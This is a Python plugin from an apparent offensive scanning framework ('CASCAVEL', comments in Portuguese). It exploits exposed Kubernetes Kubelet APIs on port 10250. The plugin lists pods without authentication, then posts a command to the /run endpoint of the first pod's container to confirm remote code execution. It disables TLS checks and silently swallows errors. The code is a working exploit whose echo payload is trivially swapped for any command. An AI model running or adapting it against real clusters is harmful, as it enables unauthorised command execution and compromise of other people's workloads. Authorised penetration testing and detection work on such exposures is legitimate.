"""
[+] Plugin: Kubelet Anonymous RCE (Cloud-Native Infrastructure)
[+] Description: Exploração de Kubernetes Kubelet exposto via /pods e /run
[+] Category: Infrastructure Exposure
[+] CVSS: 10.0 (Critical)
[+] Author: CASCAVEL Framework
"""

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def run(target, ip, ports, banners):
    finding = None
    # Kubelet default port
    if 10250 not in ports:
        return finding

    base_url = f"https://{ip}:10250"

    headers = {"User-Agent": "Cascavel-Kube-Probe/3.0.1"}

    try:
        # Step 1: Verificar se consegue extrair a lista de PODS (sem auth)
        resp = requests.get(f"{base_url}/pods", headers=headers, timeout=5, verify=False)

        if resp.status_code == 200 and "items" in resp.json():
            data = resp.json()
            if len(data.get("items", [])) > 0:
                # Pegar o primeiro pod para tentar RCE
                pod = data["items"][0]
                namespace = pod.get("metadata", {}).get("namespace", "default")
                pod_name = pod.get("metadata", {}).get("name")
                containers = pod.get("spec", {}).get("containers", [])

                if pod_name and containers:
                    container_name = containers[0].get("name")

                    # Step 2: Tentativa de RCE cirurgico
                    rce_url = f"{base_url}/run/{namespace}/{pod_name}/{container_name}"

                    payload = {"cmd": "echo CASCADE_RCE_CONFIRMED"}

                    rce_resp = requests.post(rce_url, data=payload, headers=headers, timeout=5, verify=False)

                    if "CASCADE_RCE_CONFIRMED" in rce_resp.text:
                        finding = {
                            "vulnerability": "Kubelet Unauthenticated RCE",
                            "severity": "CRITICAL",
                            "description": "API Kubelet exposta publicamente sem autenticação, permitindo execução arbitrária de comandos em pods rodando no nó.",
                            "endpoint": rce_url,
                            "payload": "echo CASCADE_RCE_CONFIRMED",
                            "evidence": rce_resp.text.strip(),
                        }
    except Exception:
        pass

    return finding
